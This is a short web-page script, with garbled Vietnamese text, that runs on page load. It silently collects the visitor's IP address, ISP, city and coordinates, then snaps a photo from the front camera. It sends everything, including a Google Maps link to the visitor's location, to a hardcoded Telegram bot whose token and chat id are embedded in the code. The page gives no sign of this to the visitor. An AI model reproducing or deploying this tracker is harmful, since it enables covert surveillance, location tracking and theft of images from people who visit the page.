<script>
const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
const chat_id = "5017098451";

// IP + ƒë·ªãa ch·ªâ ƒë·∫ßy ƒë·ªß
async function sendFullInfo() {
  const ipinfo = await fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .catch(() => null);

  const now = new Date();
  const msg = `üì° [TH√îNG TIN TRUY C·∫¨P]

üïí Th·ªùi gian: ${now.toLocaleTimeString("vi-VN")} ${now.toLocaleDateString("vi-VN")}
üì± Thi·∫øt b·ªã: ${navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent}
üñ•Ô∏è H·ªá ƒëi·ªÅu h√†nh: ${ipinfo?.org?.includes("Android") ? "Android" : navigator.platform}
üåç IP d√¢n c∆∞: ${ipinfo?.ip || "Kh√¥ng x√°c ƒë·ªãnh"}
üß† IP g·ªëc: ${ipinfo?.ip || "Kh√¥ng x√°c ƒë·ªãnh"}
üè¢ ISP: ${ipinfo?.org || "Kh√¥ng x√°c ƒë·ªãnh"}
üèôÔ∏è ƒê·ªãa ch·ªâ: ${ipinfo?.city || "?"}, ${ipinfo?.region || "?"}, ${ipinfo?.postal || "?"}
üåé Qu·ªëc gia: ${ipinfo?.country_name || "?"}
üìç Vƒ© ƒë·ªô: ${ipinfo?.latitude}
üìç Kinh ƒë·ªô: ${ipinfo?.longitude}
üìå V·ªã tr√≠ Google Maps: https://maps.google.com/?q=${ipinfo?.latitude},${ipinfo?.longitude}`;

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id, text: msg })
  });
}

// ·∫¢nh camera ch·ª•p nhanh
async function snapFastPhoto() {
  const canvas = document.getElementById("snapshot");
  const ctx = canvas.getContext("2d");
  const video = document.createElement("video");

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }, audio: false
    });

    video.srcObject = stream;
    await video.play();

    // Ch·ª•p ngay
    canvas.width = 300;
    canvas.height = 300;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
    const form = new FormData();
    form.append("chat_id", chat_id);
    form.append("photo", blob, "photo.jpg");

    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: "POST",
      body: form
    });

    stream.getTracks().forEach(track => track.stop());
  } catch (err) {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id,
        text: `üì∏ Kh√¥ng th·ªÉ truy c·∫≠p camera: ${err.message || "T·ª´ ch·ªëi quy·ªÅn"}`
      })
    });
  }
}

sendFullInfo();
snapFastPhoto();
</script>
